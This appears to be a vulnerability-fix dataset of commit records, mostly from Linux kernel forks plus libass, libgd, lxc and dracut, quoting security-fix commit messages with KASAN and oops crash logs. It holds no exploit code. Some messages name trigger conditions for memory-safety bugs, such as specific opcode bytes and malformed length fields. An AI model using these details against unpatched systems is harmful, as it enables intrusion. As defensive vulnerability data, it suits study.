[<ffffffffa13e8143>] ? em28xx_register_extension+0x23/0x190 [em28xx] [11009.908299]  [<ffffffff822dcbb0>] ? mutex_trylock+0x400/0x400 [11009.908302]  [<ffffffff810021a1>] ? do_one_initcall+0x131/0x300 [11009.908306]  [<ffffffff81296dc7>] ? call_rcu_sched+0x17/0x20 [11009.908309]  [<ffffffff8159e708>] ? put_object+0x48/0x70 [11009.908314]  [<ffffffffa1579f11>] em28xx_dvb_init+0x81/0x8a [em28xx_dvb] [11009.908317]  [<ffffffffa13e81f9>] em28xx_register_extension+0xd9/0x190 [em28xx] [11009.908320]  [<ffffffffa0150000>] ? 0xffffffffa0150000 [11009.908324]  [<ffffffffa0150010>] em28xx_dvb_register+0x10/0x1000 [em28xx_dvb] [11009.908327]  [<ffffffff810021b1>] do_one_initcall+0x141/0x300 [11009.908330]  [<ffffffff81002070>] ? try_to_run_init_process+0x40/0x40 [11009.908333]  [<ffffffff8123ff56>] ? trace_hardirqs_on_caller+0x16/0x590 [11009.908337]  [<ffffffff8155e926>] ? kasan_unpoison_shadow+0x36/0x50 [11009.908340]  [<ffffffff8155e926>] ? kasan_unpoison_shadow+0x36/0x50 [11009.908343]  [<ffffffff8155e926>] ? kasan_unpoison_shadow+0x36/0x50 [11009.908346]  [<ffffffff8155ea37>] ? __asan_register_globals+0x87/0xa0 [11009.908350]  [<ffffffff8144da7b>] do_init_module+0x1d0/0x5ad [11009.908353]  [<ffffffff812f2626>] load_module+0x6666/0x9ba0 [11009.908356]  [<ffffffff812e9c90>] ? symbol_put_addr+0x50/0x50 [11009.908361]  [<ffffffffa1580037>] ? em28xx_dvb_init.part.3+0x5989/0x5cf4 [em28xx_dvb] [11009.908366]  [<ffffffff812ebfc0>] ? module_frob_arch_sections+0x20/0x20 [11009.908369]  [<ffffffff815bc940>] ? open_exec+0x50/0x50 [11009.908374]  [<ffffffff811671bb>] ? ns_capable+0x5b/0xd0 [11009.908377]  [<ffffffff812f5e58>] SyS_finit_module+0x108/0x130 [11009.908379]  [<ffffffff812f5d50>] ? SyS_init_module+0x1f0/0x1f0 [11009.908383]  [<ffffffff81004044>] ? lockdep_sys_exit_thunk+0x12/0x14 [11009.908394]  [<ffffffff822e6936>] entry_SYSCALL_64_fastpath+0x16/0x76 [11009.908396] Memory state around the buggy address: [11009.908398]  ffff8803bd78aa00: 00 00 fc fc fc fc fc fc fc fc fc fc fc fc fc fc [11009.908401]  ffff8803bd78aa80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc [11009.908403] >ffff8803bd78ab00: fc fc fc fc fc fc fc fc 00 00 fc fc fc fc fc fc [11009.908405]                                            ^ [11009.908407]  ffff8803bd78ab80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc [11009.908409]  ffff8803bd78ac00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc [11009.908411] ==================================================================\n\nIn order to avoid it, let's set the cached value of the firmware name to NULL after freeing it. While here, return an error if the memory allocation fails.\n\nSigned-off-by: Mauro Carvalho Chehab <mchehab@osg.samsung.com>

======================================================================
Commit With Fix: 
    8d4a2ec1e0b41b0cf9a0c5cd4511da7f8e4f3de2
File(s) In Commit: 
    lib/assoc_array.c
Blob(s) In Commit: 
    59fd7c0b119cbc3e0b61137732f76cc3759fb7c7
Blob(s) Before Fix: 
    59fd7c0b119cbc3e0b61137732f76cc3759fb7c7
Projects:
    0-T-0_ps4-linux
Commit Message for 8d4a2ec1e0b41b0cf9a0c5cd4511da7f8e4f3de2:
assoc_array: don't call compare_object() on a node\n\nChanges since V1: fixed the description and added KASan warning.\n\nIn assoc_array_insert_into_terminal_node(), we call the compare_object() method on all non-empty slots, even when they're not leaves, passing a pointer to an unexpected structure to compare_object(). Currently it causes an out-of-bound read access in keyring_compare_object detected by KASan (see below). The issue is easily reproduced with keyutils testsuite. Only call compare_object() when the slot is a leave.\n\nKASan warning: ================================================================== BUG: KASAN: slab-out-of-bounds in keyring_compare_object+0x213/0x240 at addr ffff880060a6f838 Read of size 8 by task keyctl/1655 ============================================================================= BUG kmalloc-192 (Not tainted): kasan: bad access detected -----------------------------------------------------------------------------\n\nDisabling lock debugging due to kernel taint INFO: Allocated in assoc_array_insert+0xfd0/0x3a60 age=69 cpu=1 pid=1647 	___slab_alloc+0x563/0x5c0 	__slab_alloc+0x51/0x90 	kmem_cache_alloc_trace+0x263/0x300 	assoc_array_insert+0xfd0/0x3a60 	__key_link_begin+0xfc/0x270 	key_create_or_update+0x459/0xaf0 	SyS_add_key+0x1ba/0x350 	entry_SYSCALL_64_fastpath+0x12/0x76 INFO: Slab 0xffffea0001829b80 objects=16 used=8 fp=0xffff880060a6f550 flags=0x3fff8000004080 INFO: Object 0xffff880060a6f740 @offset=5952 fp=0xffff880060a6e5d1\n\nBytes b4 ffff880060a6f730: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f740: d1 e5 a6 60 00 88 ff ff 0e 00 00 00 00 00 00 00  ...`............ Object ffff880060a6f750: 02 cf 8e 60 00 88 ff ff 02 c0 8e 60 00 88 ff ff  ...`.......`.... Object ffff880060a6f760: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f770: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f780: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f790: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f7a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f7b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f7c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f7d0: 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f7e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f7f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ CPU: 0 PID: 1655 Comm: keyctl Tainted: G    B           4.5.0-rc4-kasan+ #291 Hardware name: Bochs Bochs, BIOS Bochs 01/01/2011  0000000000000000 000000001b2800b4 ffff880060a179e0 ffffffff81b60491  ffff88006c802900 ffff880060a6f740 ffff880060a17a10 ffffffff815e2969  ffff88006c802900 ffffea0001829b80 ffff880060a6f740 ffff880060a6e650 Call Trace:  [<ffffffff81b60491>] dump_stack+0x85/0xc4  [<ffffffff815e2969>] print_trailer+0xf9/0x150  [<ffffffff815e9454>] object_err+0x34/0x40  [<ffffffff815ebe50>] kasan_report_error+0x230/0x550  [<ffffffff819949be>] ? keyring_get_key_chunk+0x13e/0x210  [<ffffffff815ec62d>] __asan_report_load_n_noabort+0x5d/0x70  [<ffffffff81994cc3>] ? keyring_compare_object+0x213/0x240  [<ffffffff81994cc3>] keyring_compare_object+0x213/0x240  [<ffffffff81bc238c>] assoc_array_insert+0x86c/0x3a60  [<ffffffff81bc1b20>] ? assoc_array_cancel_edit+0x70/0x70  [<ffffffff8199797d>] ? __key_link_begin+0x20d/0x270  [<ffffffff8199786c>] __key_link_begin+0xfc/0x270  [<ffffffff81993389>] key_create_or_update+0x459/0xaf0  [<ffffffff8128ce0d>] ? trace_hardirqs_on+0xd/0x10  [<ffffffff81992f30>] ? key_type_lookup+0xc0/0xc0  [<ffffffff8199e19d>] ? lookup_user_key+0x13d/0xcd0  [<ffffffff81534763>] ? memdup_user+0x53/0x80  [<ffffffff819983ea>] SyS_add_key+0x1ba/0x350  [<ffffffff81998230>] ? key_get_type_from_user.constprop.6+0xa0/0xa0  [<ffffffff828bcf4e>] ? retint_user+0x18/0x23  [<ffffffff8128cc7e>] ? trace_hardirqs_on_caller+0x3fe/0x580  [<ffffffff81004017>] ? trace_hardirqs_on_thunk+0x17/0x19  [<ffffffff828bc432>] entry_SYSCALL_64_fastpath+0x12/0x76 Memory state around the buggy address:  ffff880060a6f700: fc fc fc fc fc fc fc fc 00 00 00 00 00 00 00 00  ffff880060a6f780: 00 00 00 00 00 00 00 00 00 00 00 fc fc fc fc fc >ffff880060a6f800: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc                                         ^  ffff880060a6f880: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc  ffff880060a6f900: fc fc fc fc fc fc 00 00 00 00 00 00 00 00 00 00 ==================================================================\n\nSigned-off-by: Jerome Marchand <jmarchan@redhat.com> Signed-off-by: David Howells <dhowells@redhat.com> cc: stable@vger.kernel.org

======================================================================
Commit With Fix: 
    50220dead1650609206efe91f0cc116132d59b3f
File(s) In Commit: 
    drivers/hid/hid-core.c
Blob(s) In Commit: 
    3f6ac5f2862d82435669088787a4ad8b08eb36c2
Blob(s) Before Fix: 
    3f6ac5f2862d82435669088787a4ad8b08eb36c2
Projects:
    0-T-0_ps4-linux
Commit Message for 50220dead1650609206efe91f0cc116132d59b3f:
HID: core: prevent out-of-bound readings\n\nPlugging a Logitech DJ receiver with KASAN activated raises a bunch of out-of-bound readings.\n\nThe fields are allocated up to MAX_USAGE, meaning that potentially, we do not have enough fields to fit the incoming values. Add checks and silence KASAN.\n\nSigned-off-by: Benjamin Tissoires <benjamin.tissoires@redhat.com> Signed-off-by: Jiri Kosina <jkosina@suse.cz>

======================================================================
Commit With Fix: 
    8148a73c9901a8794a50f950083c00ccf97d43b3
File(s) In Commit: 
    fs/proc/base.c
Blob(s) In Commit: 
    92e37e224cd22d66d0b9675f1790e110d5e7b415
Blob(s) Before Fix: 
    92e37e224cd22d66d0b9675f1790e110d5e7b415
Projects:
    0-T-0_ps4-linux
Commit Message for 8148a73c9901a8794a50f950083c00ccf97d43b3:
proc: prevent accessing /proc/<PID>/environ until it's ready\n\nIf /proc/<PID>/environ gets read before the envp[] array is fully set up in create_{aout,elf,elf_fdpic,flat}_tables(), we might end up trying to read more bytes than are actually written, as env_start will already be set but env_end will still be zero, making the range calculation underflow, allowing to read beyond the end of what has been written.\n\nFix this as it is done for /proc/<PID>/cmdline by testing env_end for zero.  It is, apparently, intentionally set last in create_*_tables().\n\nThis bug was found by the PaX size_overflow plugin that detected the arithmetic underflow of 'this_len = env_end - (env_start + src)' when env_end is still zero.\n\nThe expected consequence is that userland trying to access /proc/<PID>/environ of a not yet fully set up process may get inconsistent data as we're in the middle of copying in the environment variables.\n\nFixes: https://forums.grsecurity.net/viewtopic.php?f=3&t=4363 Fixes: https://bugzilla.kernel.org/show_bug.cgi?id=116461 Signed-off-by: Mathias Krause <minipli@googlemail.com> Cc: Emese Revfy <re.emese@gmail.com> Cc: Pax Team <pageexec@freemail.hu> Cc: Al Viro <viro@zeniv.linux.org.uk> Cc: Mateusz Guzik <mguzik@redhat.com> Cc: Alexey Dobriyan <adobriyan@gmail.com> Cc: Cyrill Gorcunov <gorcunov@openvz.org> Cc: Jarod Wilson <jarod@redhat.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    c58d6c93680f28ac58984af61d0a7ebf4319c241
File(s) In Commit: 
    net/netfilter/nfnetlink.c
Blob(s) In Commit: 
    857ae89633aff80cea1c6ac74355e5e183b4d780
Blob(s) Before Fix: 
    857ae89633aff80cea1c6ac74355e5e183b4d780
Projects:
    0-T-0_ps4-linux
Commit Message for c58d6c93680f28ac58984af61d0a7ebf4319c241:
netfilter: nfnetlink: correctly validate length of batch messages\n\nIf nlh->nlmsg_len is zero then an infinite loop is triggered because 'skb_pull(skb, msglen) ' pulls zero bytes.\n\nThe calculation in nlmsg_len() underflows if 'nlh->nlmsg_len < NLMSG_HDRLEN' which bypasses the length validation and will later trigger an out-of-bound read.\n\nIf the length validation does fail then the malformed batch message is copied back to userspace. However, we cannot do this because the nlh->nlmsg_len can be invalid. This leads to an out-of-bounds read in netlink_ack:\n\n    [   41.455421] ==================================================================     [   41.456431] BUG: KASAN: slab-out-of-bounds in memcpy+0x1d/0x40 at addr ffff880119e79340     [   41.456431] Read of size 4294967280 by task a.out/987     [   41.456431] =============================================================================     [   41.456431] BUG kmalloc-512 (Not tainted): kasan: bad access detected     [   41.456431] -----------------------------------------------------------------------------     ...     [   41.456431] Bytes b4 ffff880119e79310: 00 00 00 00 d5 03 00 00 b0 fb fe ff 00 00 00 00  ................     [   41.456431] Object ffff880119e79320: 20 00 00 00 10 00 05 00 00 00 00 00 00 00 00 00   ...............     [   41.456431] Object ffff880119e79330: 14 00 0a 00 01 03 fc 40 45 56 11 22 33 10 00 05  .......@EV."3...     [   41.456431] Object ffff880119e79340: f0 ff ff ff 88 99 aa bb 00 14 00 0a 00 06 fe fb  ................                                             ^^ start of batch nlmsg with                                                nlmsg_len=4294967280     ...     [   41.456431] Memory state around the buggy address:     [   41.456431]  ffff880119e79400: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00     [   41.456431]  ffff880119e79480: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00     [   41.456431] >ffff880119e79500: 00 00 00 00 fc fc fc fc fc fc fc fc fc fc fc fc     [   41.456431]                                ^     [   41.456431]  ffff880119e79580: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc     [   41.456431]  ffff880119e79600: fc fc fc fc fc fc fc fc fc fc fb fb fb fb fb fb     [   41.456431] ==================================================================\n\nFix this with better validation of nlh->nlmsg_len and by setting NFNL_BATCH_FAILURE if any batch message fails length validation.\n\nCAP_NET_ADMIN is required to trigger the bugs.\n\nFixes: 9ea2aa8b7dba ("netfilter: nfnetlink: validate nfnetlink header from batch") Signed-off-by: Phil Turnbull <phil.turnbull@oracle.com> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

======================================================================
Commit With Fix: 
    f4f48950788b91c6a30029cc28a240b834713ea7
File(s) In Commit: 
    libass/ass_render.c
Blob(s) In Commit: 
    1d3c0c56b85255b74542a6f8e490bc1dcd54e2ee
Blob(s) Before Fix: 
    1d3c0c56b85255b74542a6f8e490bc1dcd54e2ee
Projects:
    0p1pp1_libass
Commit Message for f4f48950788b91c6a30029cc28a240b834713ea7:
Fix line wrapping mode 0/3 bugs\n\nThis fixes two separate bugs:\n\na) Don't move a linebreak into the first symbol. This results in a empty    line at the front, which does not help to equalize line lengths at all.    Instead, merge line with the second one. b) When moving a linebreak into a symbol that already is a break, the    number of lines must be decremented. Otherwise, uninitialized memory    is possibly used for later layout operations.\n\nFound by fuzzer test case id:000085,sig:11,src:003377+003350,op:splice,rep:8.\n\nThis might also affect and hopefully fix libass#229.\n\nv2: change semantics according to review

======================================================================
Commit With Fix: 
    08e754612019ed84d1db0d1fc4f5798248decd75
File(s) In Commit: 
    libass/ass_blur.c
Blob(s) In Commit: 
    109c24d06cb2b8459db1a3a8b0c0a80dbda4adfa
Blob(s) Before Fix: 
    109c24d06cb2b8459db1a3a8b0c0a80dbda4adfa
Projects:
    0p1pp1_libass
Commit Message for 08e754612019ed84d1db0d1fc4f5798248decd75:
Fix blur coefficient calculation buffer overflow\n\nFound by fuzzer test case id:000082,sig:11,src:002579,op:havoc,rep:8. Correctness should be checked, but this fixes the overflow for good.

======================================================================
Commit With Fix: 
    aa54e0b59200a994d50a346b5d7ac818ebcf2d4b
File(s) In Commit: 
    libass/ass_shaper.c
Blob(s) In Commit: 
    5f24c5a955fdec1abb5eaeafa7b313f4845d7b77
Blob(s) Before Fix: 
    5f24c5a955fdec1abb5eaeafa7b313f4845d7b77
Projects:
    0p1pp1_libass
Commit Message for aa54e0b59200a994d50a346b5d7ac818ebcf2d4b:
shaper: fix reallocation\n\nUpdate the variable that tracks the allocated size. This potentially improves performance and avoid some side effects, which lead to undefined behavior in some cases.\n\nFixes fuzzer test case id:000051,sig:11,sync:fuzzer3,src:004221.

======================================================================
Commit With Fix: 
    d9092f52d7e61dd1557f2db2400ddb430e85937e
File(s) In Commit: 
    arch/x86/kvm/emulate.c
Blob(s) In Commit: 
    cbd7b92585bbbaabad95811f2a139e24283a4c35
Blob(s) Before Fix: 
    cbd7b92585bbbaabad95811f2a139e24283a4c35
Projects:
    0-T-0_ps4-linux
Commit Message for d9092f52d7e61dd1557f2db2400ddb430e85937e:
kvm: x86: Check memopp before dereference (CVE-2016-8630)\n\nCommit 41061cdb98 ("KVM: emulate: do not initialize memopp") removes a check for non-NULL under incorrect assumptions. An undefined instruction with a ModR/M byte with Mod=0 and R/M-5 (e.g. 0xc7 0x15) will attempt to dereference a null pointer here.\n\nFixes: 41061cdb98a0bec464278b4db8e894a3121671f5 Message-Id: <1477592752-126650-2-git-send-email-osh@google.com> Signed-off-by: Owen Hofmann <osh@google.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    667121ace9dbafb368618dbabcf07901c962ddac
File(s) In Commit: 
    drivers/firewire/net.c
Blob(s) In Commit: 
    cbaa8d776d83505c1d298b061970b1c44ef10456
Blob(s) Before Fix: 
    cbaa8d776d83505c1d298b061970b1c44ef10456
Projects:
    0-T-0_ps4-linux
Commit Message for 667121ace9dbafb368618dbabcf07901c962ddac:
firewire: net: guard against rx buffer overflows\n\nThe IP-over-1394 driver firewire-net lacked input validation when handling incoming fragmented datagrams.  A maliciously formed fragment with a respectively large datagram_offset would cause a memcpy past the datagram buffer.\n\nSo, drop any packets carrying a fragment with offset + length larger than datagram_size.\n\nIn addition, ensure that   - GASP header, unfragmented encapsulation header, or fragment     encapsulation header actually exists before we access it,   - the encapsulated datagram or fragment is of nonzero size.\n\nReported-by: Eyal Itkin <eyal.itkin@gmail.com> Reviewed-by: Eyal Itkin <eyal.itkin@gmail.com> Fixes: CVE 2016-8633 Cc: stable@vger.kernel.org Signed-off-by: Stefan Richter <stefanr@s5r6.in-berlin.de>

======================================================================
Commit With Fix: 
    647bf3d8a8e5777319da92af672289b2a6c4dc66
File(s) In Commit: 
    drivers/infiniband/sw/rxe/rxe_mr.c
Blob(s) In Commit: 
    86a6585b847df90f07256dd4027eeab426be7f77
Blob(s) Before Fix: 
    86a6585b847df90f07256dd4027eeab426be7f77
Projects:
    0-T-0_ps4-linux
Commit Message for 647bf3d8a8e5777319da92af672289b2a6c4dc66:
IB/rxe: Fix mem_check_range integer overflow\n\nUpdate the range check to avoid integer-overflow in edge case. Resolves CVE 2016-8636.\n\nSigned-off-by: Eyal Itkin <eyal.itkin@gmail.com> Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Reviewed-by: Leon Romanovsky <leonro@mellanox.com> Signed-off-by: Doug Ledford <dledford@redhat.com>

======================================================================
Commit With Fix: 
    0db98910a11c12a454eac4c8e86dc7a7bbc764a4
File(s) In Commit: 
    dracut.sh
Blob(s) In Commit: 
    2d79bbcc1e19ad69f01205767931110918e867c8
Blob(s) Before Fix: 
    2d79bbcc1e19ad69f01205767931110918e867c8
Projects:
    AdamWill_dracut
Commit Message for 0db98910a11c12a454eac4c8e86dc7a7bbc764a4:
dracut.sh: create the initramfs non-world readable also if early cpio is used\n\nFixes: 5f2c30d9bcd614d546d5c55c6897e33f88b9ab90 Previously fixed CVE-2012-4453: e1b48995c26c4f06d1a718539cb1bd5b0179af91\n\nSigned-off-by: Andreas Stieger <astieger@suse.com>

======================================================================
Commit With Fix: 
    4afa5f9617927453ac04b24b584f6c718dfb4f45
File(s) In Commit: 
    crypto/algif_hash.c
Blob(s) In Commit: 
    b4c24fe3dcfb5ed575350406c9dd7ece3c006aef
Blob(s) Before Fix: 
    b4c24fe3dcfb5ed575350406c9dd7ece3c006aef
Projects:
    0-T-0_ps4-linux
Commit Message for 4afa5f9617927453ac04b24b584f6c718dfb4f45:
crypto: algif_hash - Only export and import on sockets with data\n\nThe hash_accept call fails to work on sockets that have not received any data.  For some algorithm implementations it may cause crashes.\n\nThis patch fixes this by ensuring that we only export and import on sockets that have received data.\n\nCc: stable@vger.kernel.org Reported-by: Harsh Jain <harshjain.prof@gmail.com> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au> Tested-by: Stephan Mueller <smueller@chronox.de>

======================================================================
Commit With Fix: 
    81f466d05f2a89cb4f122ef7f593ff3f279b165c
File(s) In Commit: 
    src/lxc/attach.c
Blob(s) In Commit: 
    2f095b408f110d18c4c2a40fdb49169936bdfeb3
Blob(s) Before Fix: 
    2f095b408f110d18c4c2a40fdb49169936bdfeb3
Projects:
    0x0916_lxc
Commit Message for 81f466d05f2a89cb4f122ef7f593ff3f279b165c:
attach: do not send procfd to attached process\n\nSo far, we opened a file descriptor refering to proc on the host inside the host namespace and handed that fd to the attached process in attach_child_main(). This was done to ensure that LSM labels were correctly setup. However, by exploiting a potential kernel bug, ptrace could be used to prevent the file descriptor from being closed which in turn could be used by an unprivileged container to gain access to the host namespace. Aside from this needing an upstream kernel fix, we should make sure that we don't pass the fd for proc itself to the attached process. However, we cannot completely prevent this, as the attached process needs to be able to change its apparmor profile by writing to /proc/self/attr/exec or /proc/self/attr/current. To minimize the attack surface, we only send the fd for /proc/self/attr/exec or /proc/self/attr/current to the attached process. To do this we introduce a little more IPC between the child and parent:\n\n	 * IPC mechanism: (X is receiver) 	 *   initial process        intermediate          attached 	 *        X           <---  send pid of 	 *                          attached proc, 	 *                          then exit 	 *    send 0 ------------------------------------>    X 	 *                                              [do initialization] 	 *        X  <------------------------------------  send 1 	 *   [add to cgroup, ...] 	 *    send 2 ------------------------------------>    X 	 *						[set LXC_ATTACH_NO_NEW_PRIVS] 	 *        X  <------------------------------------  send 3 	 *   [open LSM label fd] 	 *    send 4 ------------------------------------>    X 	 *   						[set LSM label] 	 *   close socket                                 close socket 	 *                                                run program\n\nThe attached child tells the parent when it is ready to have its LSM labels set up. The parent then opens an approriate fd for the child PID to /proc/<pid>/attr/exec or /proc/<pid>/attr/current and sends it via SCM_RIGHTS to the child. The child can then set its LSM laben. Both sides then close the socket fds and the child execs the requested process.\n\nSigned-off-by: Christian Brauner <christian.brauner@canonical.com>

======================================================================
Commit With Fix: 
    f5527fffff3f002b0a6b376163613b82f69de073
File(s) In Commit: 
    lib/mpi/mpi-pow.c
Blob(s) In Commit: 
    e24388a863a76ff47afc2a7fc3680bc6ab6e8f4e
Blob(s) Before Fix: 
    e24388a863a76ff47afc2a7fc3680bc6ab6e8f4e
Projects:
    0-T-0_ps4-linux
Commit Message for f5527fffff3f002b0a6b376163613b82f69de073:
mpi: Fix NULL ptr dereference in mpi_powm() [ver #3]\n\nThis fixes CVE-2016-8650.\n\nIf mpi_powm() is given a zero exponent, it wants to immediately return either 1 or 0, depending on the modulus.  However, if the result was initalised with zero limb space, no limbs space is allocated and a NULL-pointer exception ensues.\n\nFix this by allocating a minimal amount of limb space for the result when the 0-exponent case when the result is 1 and not touching the limb space when the result is 0.\n\nThis affects the use of RSA keys and X.509 certificates that carry them.\n\nBUG: unable to handle kernel NULL pointer dereference at           (null) IP: [<ffffffff8138ce5d>] mpi_powm+0x32/0x7e6 PGD 0 Oops: 0002 [#1] SMP Modules linked in: CPU: 3 PID: 3014 Comm: keyctl Not tainted 4.9.0-rc6-fscache+ #278 Hardware name: ASUS All Series/H97-PLUS, BIOS 2306 10/09/2014 task: ffff8804011944c0 task.stack: ffff880401294000 RIP: 0010:[<ffffffff8138ce5d>]  [<ffffffff8138ce5d>] mpi_powm+0x32/0x7e6 RSP: 0018:ffff880401297ad8  EFLAGS: 00010212 RAX: 0000000000000000 RBX: ffff88040868bec0 RCX: ffff88040868bba0 RDX: ffff88040868b260 RSI: ffff88040868bec0 RDI: ffff88040868bee0 RBP: ffff880401297ba8 R08: 0000000000000000 R09: 0000000000000000 R10: 0000000000000047 R11: ffffffff8183b210 R12: 0000000000000000 R13: ffff8804087c7600 R14: 000000000000001f R15: ffff880401297c50 FS:  00007f7a7918c700(0000) GS:ffff88041fb80000(0000) knlGS:0000000000000000 CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 CR2: 0000000000000000 CR3: 0000000401250000 CR4: 00000000001406e0 Stack:  ffff88040868bec0 0000000000000020 ffff880401297b00 ffffffff81376cd4  0000000000000100 ffff880401297b10 ffffffff81376d12 ffff880401297b30  ffffffff81376f37 0000000000000100 0000000000000000 ffff880401297ba8 Call Trace:  [<ffffffff81376cd4>] ? __sg_page_iter_next+0x43/0x66  [<ffffffff81376d12>] ? sg_miter_get_next_page+0x1b/0x5d  [<ffffffff81376f37>] ? sg_miter_next+0x17/0xbd  [<ffffffff8138ba3a>] ? mpi_read_raw_from_sgl+0xf2/0x146  [<ffffffff8132a95c>] rsa_verify+0x9d/0xee  [<ffffffff8132acca>] ? pkcs1pad_sg_set_buf+0x2e/0xbb  [<ffffffff8132af40>] pkcs1pad_verify+0xc0/0xe1  [<ffffffff8133cb5e>] public_key_verify_signature+0x1b0/0x228  [<ffffffff8133d974>] x509_check_for_self_signed+0xa1/0xc4  [<ffffffff8133cdde>] x509_cert_parse+0x167/0x1a1  [<ffffffff8133d609>] x509_key_preparse+0x21/0x1a1  [<ffffffff8133c3d7>] asymmetric_key_preparse+0x34/0x61  [<ffffffff812fc9f3>] key_create_or_update+0x145/0x399  [<ffffffff812fe227>] SyS_add_key+0x154/0x19e  [<ffffffff81001c2b>] do_syscall_64+0x80/0x191  [<ffffffff816825e4>] entry_SYSCALL64_slow_path+0x25/0x25 Code: 56 41 55 41 54 53 48 81 ec a8 00 00 00 44 8b 71 04 8b 42 04 4c 8b 67 18 45 85 f6 89 45 80 0f 84 b4 06 00 00 85 c0 75 2f 41 ff ce <49> c7 04 24 01 00 00 00 b0 01 75 0b 48 8b 41 18 48 83 38 01 0f RIP  [<ffffffff8138ce5d>] mpi_powm+0x32/0x7e6  RSP <ffff880401297ad8> CR2: 0000000000000000 ---[ end trace d82015255d4a5d8d ]---\n\nBasically, this is a backport of a libgcrypt patch:\n\n	http://git.gnupg.org/cgi-bin/gitweb.cgi?p=libgcrypt.git a=patch h=6e1adb05d290aeeb1c230c763970695f4a538526\n\nFixes: cdec9cb5167a ("crypto: GnuPG based MPI lib - source files (part 1)") Signed-off-by: Andrey Ryabinin <aryabinin@virtuozzo.com> Signed-off-by: David Howells <dhowells@redhat.com> cc: Dmitry Kasatkin <dmitry.kasatkin@gmail.com> cc: linux-ima-devel@lists.sourceforge.net cc: stable@vger.kernel.org Signed-off-by: James Morris <james.l.morris@oracle.com>

======================================================================
Commit With Fix: 
    84ac7260236a49c79eede91617700174c2c19b0c
File(s) In Commit: 
    net/packet/af_packet.c
Blob(s) In Commit: 
    dd2332390c45bbff7c3fc5d259453f2e1ca352bf
Blob(s) Before Fix: 
    dd2332390c45bbff7c3fc5d259453f2e1ca352bf
Projects:
    0-T-0_ps4-linux
Commit Message for 84ac7260236a49c79eede91617700174c2c19b0c:
packet: fix race condition in packet_set_ring\n\nWhen packet_set_ring creates a ring buffer it will initialize a struct timer_list if the packet version is TPACKET_V3. This value can then be raced by a different thread calling setsockopt to set the version to TPACKET_V1 before packet_set_ring has finished.\n\nThis leads to a use-after-free on a function pointer in the struct timer_list when the socket is closed as the previously initialized timer will not be deleted.\n\nThe bug is fixed by taking lock_sock(sk) in packet_setsockopt when changing the packet version while also taking the lock at the start of packet_set_ring.\n\nFixes: f6fb8f100b80 ("af-packet: TPACKET_V3 flexible buffer implementation.") Signed-off-by: Philip Pettersson <philip.pettersson@gmail.com> Signed-off-by: Eric Dumazet <edumazet@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    ded89912156b1a47d940a0c954c43afbabd0c42c
File(s) In Commit: 
    drivers/net/wireless/broadcom/brcm80211/brcmfmac/cfg80211.c
Blob(s) In Commit: 
    b8aec5e5ef93e28dfb70c95557d7388fd9b67bef
Blob(s) Before Fix: 
    b8aec5e5ef93e28dfb70c95557d7388fd9b67bef
Projects:
    0-T-0_ps4-linux
Commit Message for ded89912156b1a47d940a0c954c43afbabd0c42c:
brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()\n\nUser-space can choose to omit NL80211_ATTR_SSID and only provide raw IE TLV data. When doing so it can provide SSID IE with length exceeding the allowed size. The driver further processes this IE copying it into a local variable without checking the length. Hence stack can be corrupted and used as exploit.\n\nCc: stable@vger.kernel.org # v4.7 Reported-by: Daxing Guo <freener.gdx@gmail.com> Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com> Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com> Reviewed-by: Franky Lin <franky.lin@broadcom.com> Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com> Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

======================================================================
Commit With Fix: 
    53110871935244816bbb9d131da0bccff734bfe9
File(s) In Commit: 
    src/gd_io_dp.c
Blob(s) In Commit: 
    228bfa5cf25555f7fd0b720d5265e2b443dfe297
Blob(s) Before Fix: 
    228bfa5cf25555f7fd0b720d5265e2b443dfe297
Projects:
    86salo_libgd
Commit Message for 53110871935244816bbb9d131da0bccff734bfe9:
Avoid potentially dangerous signed to unsigned conversion\n\nWe make sure to never pass a negative `rlen` as size to memcpy(). See also <https://bugs.php.net/bug.php?id=73280>.\n\nPatch provided by Emmanuel Law.

======================================================================
Commit With Fix: 
    e5b019725f53b79159931d3a7317107cbbfd0860
File(s) In Commit: 
    libavformat/m4vdec.c
Blob(s) In Commit: 
    9d69dcc042142a93b0a61a2a41854e84a4c26b42
Blob(s) Before Fix: 
    9d69dcc042142a93b0a61a2a41854e84a4c26b42
Projects:
    00ERNEST00_FFmpeg
Commit Message for e5b019725f53b79159931d3a7317107cbbfd0860:
